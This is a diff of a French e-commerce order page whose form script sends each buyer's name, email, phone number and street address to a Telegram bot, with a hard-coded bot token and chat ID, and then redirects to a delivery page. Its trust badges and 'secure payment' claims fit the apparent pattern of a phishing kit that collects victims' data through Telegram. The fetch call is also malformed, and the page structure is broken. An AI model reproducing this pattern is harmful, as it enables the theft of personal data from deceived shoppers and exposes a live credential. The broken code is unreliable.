@@ -467,154 +467,155 @@
 </html>
 
 
-        <!-- Barre de progression -->
-        <div class="progress-bar">
-            <div class="step active">
-                <span>1</span>
-                <p>Produit</p>
-            </div>
-            <div class="step active">
-                <span>2</span>
-                <p>Informations</p>
-            </div>
-            <div class="step">
-                <span>3</span>
-                <p>Confirmation</p>
-            </div>
+       <!-- Barre de progression -->
+<div class="progress-bar">
+    <div class="step active">
+        <span>1</span>
+        <p>Produit</p>
+    </div>
+    <div class="step active">
+        <span>2</span>
+        <p>Informations</p>
+    </div>
+    <div class="step">
+        <span>3</span>
+        <p>Confirmation</p>
+    </div>
+</div>
+
+<!-- Formulaire -->
+<div class="container">
+    <h2>Remplissez vos informations</h2>
+    <form id="orderForm">
+        <div class="form-group">
+            <label for="nom_complet">Nom et prénom *</label>
+            <input type="text" id="nom_complet" name="nom_complet" required placeholder="Entrez votre nom et prénom">
+        </div>
+        <div class="form-group">
+            <label for="email">Email *</label>
+            <input type="email" id="email" name="email" required placeholder="Entrez votre email">
+        </div>
+        <div class="form-group">
+            <label for="telephone">Téléphone *</label>
+            <input type="tel" id="telephone" name="telephone" required placeholder="Entrez votre numéro de téléphone">
+        </div>
+        <div class="form-group">
+            <label for="rue">Rue *</label>
+            <input type="text" id="rue" name="rue" required placeholder="Entrez votre rue">
+        </div>
+        <div class="form-group">
+            <label for="numero">N°</label>
+            <input type="tel" id="numero" name="numero" placeholder="Entrez votre numéro de rue">
+        </div>
+        <div class="form-group">
+            <label for="code_postal">Code postal *</label>
+            <input type="text" id="code_postal" name="code_postal" required placeholder="Entrez votre code postal">
+        </div>
+        <div class="form-group">
+            <label for="ville">Ville *</label>
+            <input type="text" id="ville" name="ville" required placeholder="Entrez votre ville">
         </div>
 
-         <!-- Formulaire -->
-    <div class="container">
-        <h2>Remplissez vos informations</h2>
-        <form id="orderForm">
-            <div class="form-group">
-                <label for="nom_complet">Nom et prénom *</label>
-                <input type="text" id="nom_complet" name="nom_complet" required placeholder="Entrez votre nom et prénom">
-            </div>
-            <div class="form-group">
-                <label for="email">Email *</label>
-                <input type="email" id="email" name="email" required placeholder="Entrez votre email">
-            </div>
-            <div class="form-group">
-                <label for="telephone">Téléphone *</label>
-                <input type="tel" id="telephone" name="telephone" required placeholder="Entrez votre numéro de téléphone">
-            </div>
-            <div class="form-group">
-                <label for="rue">Rue *</label>
-                <input type="text" id="rue" name="rue" required placeholder="Entrez votre rue">
-            </div>
-            <div class="form-group">
-                <label for="numero">N°</label>
-                <input type="tel" id="numero" name="numero" placeholder="Entrez votre numéro de rue">
-            </div>
-            <div class="form-group">
-                <label for="code_postal">Code postal *</label>
-                <input type="text" id="code_postal" name="code_postal" required placeholder="Entrez votre code postal">
-            </div>
-            <div class="form-group">
-                <label for="ville">Ville *</label>
-                <input type="text" id="ville" name="ville" required placeholder="Entrez votre ville">
-            </div>
+        <!-- Bouton pour afficher le champ Hameau -->
+        <div class="form-group">
+            <input type="checkbox" id="toggle_hameau" onclick="toggleHameauField()">
+            <label for="toggle_hameau">Habitez-vous dans un hameau ?</label>
+        </div>
 
-            <!-- Bouton pour afficher le champ Hameau -->
-            <div class="form-group">
-                <input type="checkbox" id="toggle_hameau" onclick="toggleHameauField()">
-                <label for="toggle_hameau">Habitez-vous dans un hameau ?</label>
-            </div>
+        <!-- Champ Hameau masqué par défaut -->
+        <div class="form-group" id="hameau_field" style="display: none;">
+            <label for="hameau">Nom du hameau</label>
+            <input type="text" id="hameau" name="hameau" placeholder="Entrez le nom de votre hameau">
+        </div>
 
-            <!-- Champ Hameau masqué par défaut -->
-            <div class="form-group" id="hameau_field" style="display: none;">
-                <label for="hameau">Nom du hameau</label>
-                <input type="text" id="hameau" name="hameau" placeholder="Entrez le nom de votre hameau">
-            </div>
+        <div class="form-group">
+            <input type="submit" value="Confirmer La Commande">
+        </div>
+    </form>
+</div>
 
-            <div class="form-group">
-                <input type="submit" value="Confirmer La Commande">
-            </div>
-        </form>
-    </div>
+<script>
+    // إظهار أو إخفاء الحقل الخاص بالهامو
+    function toggleHameauField() {
+        const hameauField = document.getElementById('hameau_field');
+        const toggleCheckbox = document.getElementById('toggle_hameau');
+        hameauField.style.display = toggleCheckbox.checked ? 'block' : 'none';
+    }
 
-    <script>
-        // إظهار أو إخفاء الحقل الخاص بالهامو
-        function toggleHameauField() {
-            const hameauField = document.getElementById('hameau_field');
-            const toggleCheckbox = document.getElementById('toggle_hameau');
-            hameauField.style.display = toggleCheckbox.checked ? 'block' : 'none';
-        }
+    // إرسال البيانات إلى Telegram عند تقديم الطلب
+    document.getElementById("orderForm").addEventListener("submit", function (e) {
+        e.preventDefault();
 
-        // إرسال البيانات إلى Telegram عند تقديم الطلب
-        document.getElementById("orderForm").addEventListener("submit", function (e) {
-            e.preventDefault();
+        const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU"; // استبدل بالتوكن الخاص بك
+        const chatId = "5372119436"; // استبدل بمعرف الدردشة الخاص بك
 
-            const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU"; // استبدل بالتوكن الخاص بك
-            const chatId = "5372119436"; // استبدل بمعرف الدردشة الخاص بك
+        const formData = new FormData(this);
+        const message = `
+            Nouvelle commande:
+            Nom: ${formData.get("nom_complet")}
+            Email: ${formData.get("email")}
+            Téléphone: ${formData.get("telephone")}
+            Rue: ${formData.get("rue")}
+            N°: ${formData.get("numero") || "Non spécifié"}
+            Code Postal: ${formData.get("code_postal")}
+            Ville: ${formData.get("ville")}
+            Hameau: ${formData.get("hameau") || "Non spécifié"}
+        `;
 
-            const formData = new FormData(this);
-            const message = `
-                Nouvelle commande:
-                Nom: ${formData.get("nom_complet")}
-                Email: ${formData.get("email")}
-                Téléphone: ${formData.get("telephone")}
-                Rue: ${formData.get("rue")}
-                N°: ${formData.get("numero") || "Non spécifié"}
-                Code Postal: ${formData.get("code_postal")}
-                Ville: ${formData.get("ville")}
-                Hameau: ${formData.get("hameau") || "Non spécifié"}
-            `;
-
-            fetch(https://api.telegram.org/bot${token}/sendMessage, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                }),
-            })
-            .then(response => {
-                if (response.ok) {
-                    alert("Commande envoyée avec succès !");
-                    window.location.href = "page-livraison1.html"; // تحويل إلى الصفحة الجديدة
-                } else {
-                    alert("Erreur lors de l'envoi de la commande. Veuillez réessayer.");
-                }
-            })
-            .catch(error => {
-                console.error("Erreur:", error);
-                alert("Erreur réseau. Veuillez réessayer.");
-            });
+        // إرسال البيانات إلى تلغرام
+        fetch(https://api.telegram.org/bot${token}/sendMessage, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+            }),
+        })
+        .then(response => {
+            if (response.ok) {
+                alert("Commande envoyée avec succès !");
+                window.location.href = "page-livraison1.html"; // تحويل إلى الصفحة الجديدة
+            } else {
+                alert("Erreur lors de l'envoi de la commande. Veuillez réessayer.");
+            }
+        })
+        .catch(error => {
+            console.error("Erreur:", error);
+            alert("Erreur réseau. Veuillez réessayer.");
         });
-    </script>
-</body>
-</html>
+    });
+</script>
 
-        <!-- FAQ -->
-        <div class="faq">
-            <h3>Questions Fréquemment Posées</h3>
-            <p><strong>Est-il possible de retourner le produit ?</strong> Oui, les retours sont possibles sous 14 jours.</p>
-            <p><strong>Quels sont les délais de livraison ?</strong> Livraison sous 1 à 2 jours ouvrables en France.</p>
-            <p><strong>Puis-je payer en plusieurs fois ?</strong> Oui, des options de paiement en plusieurs fois sont disponibles.</p>
-        </div>
+<!-- FAQ -->
+<div class="faq">
+    <h3>Questions Fréquemment Posées</h3>
+    <p><strong>Est-il possible de retourner le produit ?</strong> Oui, les retours sont possibles sous 14 jours.</p>
+    <p><strong>Quels sont les délais de livraison ?</strong> Livraison sous 1 à 2 jours ouvrables en France.</p>
+    <p><strong>Puis-je payer en plusieurs fois ?</strong> Oui, des options de paiement en plusieurs fois sont disponibles.</p>
+</div>
 
-        <!-- Badges de confiance -->
-        <div class="trust-badges">
-            <div>
-                <img src="Paiement-CB.jpg" alt="Paiement Sécurisé">
-                <p>Paiement Sécurisé</p>
-            </div>
-            <div>
-                <img src="satisfaction.jpg" alt="Garantie de Satisfaction">
-                <p>Garantie Satisfaction</p>
-            </div>
-            <div>
-                <img src="227-category_default.webp" alt="Expédition Rapide">
-                <p>Expédition Rapide</p>
-            </div>
-        </div>
+<!-- Badges de confiance -->
+<div class="trust-badges">
+    <div>
+        <img src="Paiement-CB.jpg" alt="Paiement Sécurisé">
+        <p>Paiement Sécurisé</p>
     </div>
+    <div>
+        <img src="satisfaction.jpg" alt="Garantie de Satisfaction">
+        <p>Garantie Satisfaction</p>
+    </div>
+    <div>
+        <img src="227-category_default.webp" alt="Expédition Rapide">
+        <p>Expédition Rapide</p>
+    </div>
+</div>
+
 </body>
 </html>
+
+        
         <!-- Footer -->
 <footer style="background-color: #2c3e50; color: #ecf0f1; padding: 20px;">
     <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
